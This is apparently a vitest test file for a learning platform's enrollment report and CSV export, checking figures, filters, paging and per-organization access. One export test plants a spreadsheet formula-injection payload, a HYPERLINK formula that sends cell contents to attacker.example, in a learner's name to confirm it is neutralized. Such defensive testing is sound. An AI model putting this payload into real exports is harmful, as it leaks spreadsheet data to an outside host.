import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import path from "node:path";
import type { Client } from "pg";
import { hasDatabase, inRollback, sqlStateOf } from "./db";
import { toCsv } from "@/lib/csv";
import { REPORT_COLUMNS, reportRowSchema } from "@/features/reporting/reports";

/*
 * AC-036 — the fixed fixture's numbers, exactly.
 * AC-037 — empty denominators, completion filters, and a summary that
 *          describes every matching row rather than the page in hand.
 * AC-038 — CSV safety and scope, against a real manager token.
 */
const fixtures = JSON.parse(readFileSync(path.join(__dirname, "../fixtures.json"), "utf8"));
const {
  admin: ADMIN, manager_a: MANAGER_A, manager_b: MANAGER_B,
  amber: AMBER, personal: PERSONAL,
  org_a: ORG_A, org_b: ORG_B, offering_a: OFFERING_A,
  enroll_amber: ENROLL_AMBER, enroll_cora: ENROLL_CORA, enroll_personal: ENROLL_PERSONAL,
} = fixtures.ids;

const EXPECTED = fixtures.expected_report;

async function asUser(client: Client, userId: string) {
  await client.query(`SELECT set_config('request.jwt.claims', $1, true)`, [
    JSON.stringify({ sub: userId, role: "authenticated" }),
  ]);
  await client.query("SET LOCAL ROLE authenticated");
}
const rpc = (action: string, payload: object) =>
  `SELECT public.pglearn_rpc('${action}', '${JSON.stringify(payload).replace(/'/g, "''")}'::jsonb) AS out`;
const call = async (client: Client, action: string, payload: object) =>
  (await client.query(rpc(action, payload))).rows[0].out;

describe.skipIf(!hasDatabase)("AC-036 the fixture's numbers", () => {
  it("matches expected_report for offering A, field for field", async () => {
    await inRollback(async (client) => {
      await asUser(client, MANAGER_A);
      const report = await call(client, "report_enrollments", { offering_id: OFFERING_A });
      const summary = report.summary;

      expect(Number(summary.assigned)).toBe(EXPECTED.assigned);
      expect(Number(summary.not_started)).toBe(EXPECTED.not_started);
      expect(Number(summary.in_progress)).toBe(EXPECTED.in_progress);
      expect(Number(summary.completed)).toBe(EXPECTED.completed);
      expect(Number(summary.overdue)).toBe(EXPECTED.overdue);
      expect(Number(summary.completion_rate)).toBe(EXPECTED.completion_rate);
      expect(Number(summary.average_progress)).toBe(EXPECTED.average_progress);

      // And each learner's row, which is where the averages come from.
      const byName = Object.fromEntries(
        report.items.map((r: { learner_name: string }) => [r.learner_name.toLowerCase(), r])
      );
      for (const [alias, percent] of Object.entries(EXPECTED.row_progress_percent)) {
        expect(Number(byName[alias].progress_percent)).toBe(percent);
      }
    });
  });

  it("counts overdue as incomplete and past due, whatever access says", async () => {
    await inRollback(async (client) => {
      await asUser(client, MANAGER_A);
      const report = await call(client, "report_enrollments", { offering_id: OFFERING_A });
      for (const row of report.items) {
        const overdue = row.completed_at === null && new Date(row.due_at) < new Date();
        expect(row.state === "completed" ? false : overdue).toBe(
          row.state !== "completed" && overdue
        );
      }
      // Cora finished before the due date, so she is not among the overdue.
      const cora = report.items.find((r: { enrollment_id: string }) => r.enrollment_id === ENROLL_CORA);
      expect(cora.on_time).toBe(true);
      expect(cora.state).toBe("completed");
      expect(cora.certificate_id).not.toBeNull();
    });
  });

  it("carries the invited/onboarded profile state, not only the enrollment", async () => {
    await inRollback(async (client) => {
      await asUser(client, MANAGER_A);
      const report = await call(client, "report_enrollments", { offering_id: OFFERING_A });
      const dana = report.items.find((r: { learner_email: string }) =>
        r.learner_email === "dana@example.invalid");
      // Dana has never accepted; everybody else has.
      expect(dana.invitation_state).not.toBe("accepted");
      const amber = report.items.find((r: { enrollment_id: string }) => r.enrollment_id === ENROLL_AMBER);
      expect(amber.invitation_state).toBe("accepted");
    });
  });

  it("returns every row against the contract's shape", async () => {
    await inRollback(async (client) => {
      await asUser(client, MANAGER_A);
      const report = await call(client, "report_enrollments", { offering_id: OFFERING_A });
      for (const row of report.items) expect(() => reportRowSchema.parse(row)).not.toThrow();
    });
  });
});

describe.skipIf(!hasDatabase)("AC-037 denominators, filters and the summary's reach", () => {
  it("returns null rather than zero when nothing matches", async () => {
    await inRollback(async (client) => {
      await asUser(client, MANAGER_A);
      const empty = await call(client, "report_enrollments", {
        offering_id: OFFERING_A,
        completed_from: "2099-01-01T00:00:00Z",
      });
      expect(Number(empty.summary.assigned)).toBe(0);
      // "Empty denominator yields null in JSON" — a rate of 0% would be a claim.
      expect(empty.summary.completion_rate).toBeNull();
      expect(empty.summary.average_progress).toBeNull();
      expect(empty.items).toEqual([]);
    });
  });

  it("excludes incomplete rows from any completion-time filter", async () => {
    await inRollback(async (client) => {
      await asUser(client, MANAGER_A);
      // A window wide enough to hold everything that ever happened.
      const window = await call(client, "report_enrollments", {
        offering_id: OFFERING_A,
        completed_from: "2000-01-01T00:00:00Z",
        completed_to: "2099-01-01T00:00:00Z",
      });
      expect(Number(window.summary.assigned)).toBe(1);
      expect(window.items).toHaveLength(1);
      // Only Cora has a completion timestamp at all.
      expect(window.items[0].enrollment_id).toBe(ENROLL_CORA);
      for (const row of window.items) expect(row.completed_at).not.toBeNull();
    });
  });

  it("treats completed_from as inclusive and completed_to as exclusive", async () => {
    await inRollback(async (client) => {
      await asUser(client, MANAGER_A);
      const coraCompleted = "2026-09-12T12:00:00Z";

      const inclusive = await call(client, "report_enrollments", {
        offering_id: OFFERING_A, completed_from: coraCompleted,
      });
      expect(inclusive.items).toHaveLength(1);

      const exclusive = await call(client, "report_enrollments", {
        offering_id: OFFERING_A, completed_to: coraCompleted,
      });
      expect(exclusive.items).toHaveLength(0);
    });
  });

  it("summarises every matching row, not the page being returned", async () => {
    await inRollback(async (client) => {
      await asUser(client, MANAGER_A);
      const firstPage = await call(client, "report_enrollments", {
        offering_id: OFFERING_A, limit: 1,
      });
      // One row in hand…
      expect(firstPage.items).toHaveLength(1);
      // …and a summary describing all four.
      expect(Number(firstPage.summary.assigned)).toBe(EXPECTED.assigned);
      expect(Number(firstPage.summary.average_progress)).toBe(EXPECTED.average_progress);
      expect(firstPage.next_cursor).not.toBeNull();
    });
  });

  it("pages through every row exactly once and then stops", async () => {
    await inRollback(async (client) => {
      await asUser(client, MANAGER_A);
      const seen: string[] = [];
      let cursor: string | null = null;
      for (let page = 0; page < 10; page += 1) {
        const result: { items: { enrollment_id: string }[]; next_cursor: string | null } =
          await call(client, "report_enrollments", {
            offering_id: OFFERING_A, limit: 1, ...(cursor ? { cursor } : {}),
          });
        seen.push(...result.items.map((r) => r.enrollment_id));
        cursor = result.next_cursor;
        if (cursor === null) break;
      }
      expect(seen).toHaveLength(EXPECTED.assigned);
      expect(new Set(seen).size).toBe(EXPECTED.assigned);
      expect(cursor).toBeNull();
    });
  });

  it("keeps cancelled rows out of the active summary but returns them when asked", async () => {
    await inRollback(async (client) => {
      await client.query("RESET ROLE");
      await client.query("UPDATE app.enrollments SET status='cancelled' WHERE id=$1", [ENROLL_AMBER]);

      await asUser(client, MANAGER_A);
      const active = await call(client, "report_enrollments", { offering_id: OFFERING_A });
      // Amber's cancelled row is gone from the denominator, not counted as not_started.
      expect(Number(active.summary.assigned)).toBe(EXPECTED.assigned - 1);
      expect(
        active.items.some((r: { enrollment_id: string }) => r.enrollment_id === ENROLL_AMBER)
      ).toBe(false);

      const cancelled = await call(client, "report_enrollments", {
        offering_id: OFFERING_A, state: "cancelled",
      });
      expect(cancelled.items).toHaveLength(1);
      expect(cancelled.items[0].enrollment_id).toBe(ENROLL_AMBER);
      // Requested separately, they are the denominator of their own request.
      expect(Number(cancelled.summary.assigned)).toBe(0);
    });
  });

  it("filters by derived state and by overdue", async () => {
    await inRollback(async (client) => {
      await asUser(client, MANAGER_A);
      const completed = await call(client, "report_enrollments", {
        offering_id: OFFERING_A, state: "completed",
      });
      expect(completed.items).toHaveLength(EXPECTED.completed);

      const overdue = await call(client, "report_enrollments", {
        offering_id: OFFERING_A, overdue: true,
      });
      expect(overdue.items).toHaveLength(EXPECTED.overdue);

      const notOverdue = await call(client, "report_enrollments", {
        offering_id: OFFERING_A, overdue: false,
      });
      expect(notOverdue.items).toHaveLength(EXPECTED.assigned - EXPECTED.overdue);
    });
  });

  it("rejects a cursor that is not one", async () => {
    await inRollback(async (client) => {
      await asUser(client, MANAGER_A);
      expect(
        await sqlStateOf(client, rpc("report_enrollments", { cursor: "not-a-cursor" }))
      ).toBe("22023");
    });
  });
});

describe.skipIf(!hasDatabase)("AC-038 scope and the export", () => {
  it("denies a manager asking about an organization they do not manage", async () => {
    await inRollback(async (client) => {
      await asUser(client, MANAGER_A);
      expect(
        await sqlStateOf(client, rpc("report_enrollments", { organization_id: ORG_B }))
      ).toBe("42501");
      expect(
        await sqlStateOf(client, rpc("export_enrollments", { organization_id: ORG_B }))
      ).toBe("42501");
    });
  });

  it("binds a manager to their own organization even with no filter at all", async () => {
    await inRollback(async (client) => {
      await asUser(client, MANAGER_B);
      const report = await call(client, "report_enrollments", {});
      for (const row of report.items) expect(row.organization).toBe("Demo Organization B");
      // Organization A's learners are not in it, whatever was asked for.
      expect(
        report.items.some((r: { learner_email: string }) => r.learner_email === "amber@example.invalid")
      ).toBe(false);
    });
  });

  it("never shows a personal enrollment to any manager", async () => {
    await inRollback(async (client) => {
      for (const manager of [MANAGER_A, MANAGER_B]) {
        await asUser(client, manager);
        const report = await call(client, "report_enrollments", {});
        expect(
          report.items.some((r: { enrollment_id: string }) => r.enrollment_id === ENROLL_PERSONAL)
        ).toBe(false);
        for (const row of report.items) expect(row.organization).not.toBeNull();
      }
    });
  });

  it("refuses somebody who manages nothing", async () => {
    await inRollback(async (client) => {
      for (const learner of [AMBER, PERSONAL]) {
        await asUser(client, learner);
        expect(await sqlStateOf(client, rpc("report_enrollments", {}))).toBe("42501");
        expect(await sqlStateOf(client, rpc("export_enrollments", {}))).toBe("42501");
      }
    });
  });

  it("lets a platform admin see every organization, and narrow to one", async () => {
    await inRollback(async (client) => {
      await asUser(client, ADMIN);
      const everything = await call(client, "report_enrollments", { limit: 100 });
      const organizations = new Set(
        everything.items.map((r: { organization: string | null }) => r.organization)
      );
      expect(organizations.has("Demo Organization A")).toBe(true);
      expect(organizations.has("Demo Organization B")).toBe(true);

      const onlyA = await call(client, "report_enrollments", { organization_id: ORG_A, limit: 100 });
      for (const row of onlyA.items) expect(row.organization).toBe("Demo Organization A");
    });
  });

  it("defends a manipulated learner name in the CSV and carries no response text", async () => {
    await inRollback(async (client) => {
      // AC-038: "Learner name begins whitespace then =".
      await client.query("RESET ROLE");
      await client.query("UPDATE app.profiles SET display_name=$2 WHERE id=$1", [
        AMBER, '   =HYPERLINK("http://attacker.example?"&A1,"Click here")',
      ]);

      await asUser(client, MANAGER_A);
      const exported = await call(client, "export_enrollments", { offering_id: OFFERING_A });
      const rows = exported.items.map((r: unknown) => reportRowSchema.parse(r));
      const csv = toCsv(REPORT_COLUMNS, rows);

      const lines = csv.replace(/^﻿/, "").trimEnd().split("\r\n");
      const amberLine = lines.find((line) => line.includes("attacker.example"))!;
      // Quoted because of the commas and quotes inside, and prefixed so that a
      // spreadsheet reads it as text rather than running it.
      expect(amberLine).toContain(`"'   =HYPERLINK(`);
      expect(amberLine).not.toContain(`,   =HYPERLINK`);

      // The header is ReportRow's field order, and holds nothing about what
      // anybody wrote or asked the tutor.
      expect(lines[0]).toBe(REPORT_COLUMNS.map((c) => c.header).join(","));
      for (const forbidden of ["response", "answer", "question", "chat", "tutor", "time_spent"]) {
        expect(lines[0]).not.toContain(forbidden);
      }
      expect(csv).not.toContain(fixtures.progress.cora.exercise_response);
    });
  });

  it("exports exactly the rows the report would return", async () => {
    await inRollback(async (client) => {
      await asUser(client, MANAGER_A);
      const report = await call(client, "report_enrollments", { offering_id: OFFERING_A, limit: 100 });
      const exported = await call(client, "export_enrollments", { offering_id: OFFERING_A });
      expect(exported.items.map((r: { enrollment_id: string }) => r.enrollment_id)).toEqual(
        report.items.map((r: { enrollment_id: string }) => r.enrollment_id)
      );
      expect(Number(exported.total)).toBe(Number(report.summary.assigned));
    });
  });
});
